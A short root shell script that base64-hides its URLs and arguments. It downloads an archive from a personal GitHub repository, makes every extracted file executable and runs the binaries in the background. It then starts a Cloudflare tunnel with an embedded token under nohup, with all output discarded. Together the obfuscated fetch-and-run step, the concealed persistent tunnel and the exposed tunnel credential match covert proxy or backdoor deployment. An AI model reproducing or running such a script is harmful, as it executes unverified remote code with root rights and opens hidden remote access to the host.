cd /root
weburl_S='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3pob3V6aGVucWkvZmlsZS9tYXN0ZXIvd2ViLnRhci54ego='
weburl=$(printf "%s" $weburl_S | base64 -d) 
curl -O $weburl
sleep 1
xz -z -d web.tar.xz
tar -xvf web.tar
chmod +x *
./web.js -c ./config.json &
./cy run --config ./cyfile --adapter caddyfile &
cturl_S='aHR0cHM6Ly9naXRodWIuY29tL2Nsb3VkZmxhcmUvY2xvdWRmbGFyZWQvcmVsZWFzZXMvbGF0ZXN0L2Rvd25sb2FkL2Nsb3VkZmxhcmVkLWxpbnV4LWFtZDY0Cg=='
cturl=$(printf "%s" $cturl_S | base64 -d) 
curl -o cf -L $cturl
chmod +x cf
ARGO_ARGS_S='LS1wcm90b2NvbCBodHRwMiAtLWVkZ2UtaXAtdmVyc2lvbiA0IHR1bm5lbCBydW4gLS10b2tlbiBleUpoSWpvaU9UTTVaak5tWTJVek16SXlPR1ZqWXpObVlqTTBPRGxpWVRGaU1XVXdNVFlpTENKMElqb2lZek0xTWpneE9UY3ROR1kzTkMwMFpUTTBMV0k0TjJZdE1ETTRNR0ptWkRobU4yUXhJaXdpY3lJNklrMVhWWHBaYlZWNldtcFZkRTFxUVRCYWFUQXdUV3BKZDB4VVozbFBWR2QwVFVSWmVrMTZhR3BPYlZwcFRsUmFiQ0o5Cg=='
ARGO_ARGS=$(printf "%s" $ARGO_ARGS_S | base64 -d) 
nohup ./cf $ARGO_ARGS >/dev/null 2>&1 &
